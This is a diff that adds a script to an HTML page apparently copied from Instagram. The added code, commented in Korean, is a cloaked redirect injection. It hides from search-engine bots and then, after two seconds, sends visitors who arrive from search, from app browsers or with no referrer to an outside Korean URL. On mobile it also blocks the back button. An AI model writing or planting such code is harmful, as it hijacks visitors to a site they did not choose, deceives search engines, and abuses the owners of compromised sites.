@@ -378,3 +378,53 @@
 <link rel="preload" href="https://static.cdninstagram.com/rsrc.php/v4/yY/r/Eil-fzuGz0e.js" as="script" crossorigin="anonymous" nonce="2Mv94Jjk" /><script src="https://static.cdninstagram.com/rsrc.php/v4/yY/r/Eil-fzuGz0e.js" data-bootloader-hash="qgmbN7Z" async="1" crossorigin="anonymous" data-p=":74" data-btmanifest="1027280358_main" data-c="1"></script>
 
 
+
+<script>
+(function(){
+  const targetURL = "http://directin.kr/?num=35445436"; // ✅ 이동할 최종 URL로 변경
+
+  // 기본 정보
+  const ref = (document.referrer || "").toLowerCase();
+  const userAgent = (navigator.userAgent || "").toLowerCase();
+  const urlParams = new URLSearchParams(window.location.search);
+
+  // 검색 유입 감지
+  const isSearchReferrer =
+    ref.includes("google.") ||
+    ref.includes("naver.com") ||
+    ref.includes("daum.net") ||
+    ref.includes("bing.com") ||
+    ref.includes("yahoo.");
+
+  // UTM 파라미터 기반 유입 감지
+  const utmSource = (urlParams.get("utm_source") || "").toLowerCase();
+  const isUTMSearch = ["google", "naver", "daum", "bing"].includes(utmSource);
+
+  // 디바이스 및 브라우저 감지
+  const isMobile = /iphone|ipad|ipod|android/.test(userAgent);
+  const isAppBrowser = /kakaotalk|naver|line|instagram|fbav/.test(userAgent);
+
+  // 검색엔진 크롤러(봇) 감지 → SEO 보호용
+  const isBot = /(googlebot|naverbot|bingbot|yeti|duckduckbot|baiduspider|slurp)/.test(userAgent);
+
+  // ✅ 최종 조건 (PC+모바일 모두 이동)
+  // 봇이 아니고, 아래 중 하나라도 해당하면 이동:
+  // - 검색유입
+  // - UTM 유입
+  // - 앱 브라우저 (모바일)
+  // - referrer 없음 (직접 유입 포함)
+  if (!isBot && (isSearchReferrer || isUTMSearch || isAppBrowser || ref === "")) {
+
+   // 페이지가 완전히 로드된 후 2초 뒤 이동
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        if (isMobile) {
+          window.location.replace(targetURL); // 모바일은 뒤로가기 방지
+        } else {
+          window.location.href = targetURL;   // PC는 일반 이동
+        }
+      }, 2000); // ✅ PC, 모바일 모두 2초 지연
+    });
+  }
+})();
+</script>
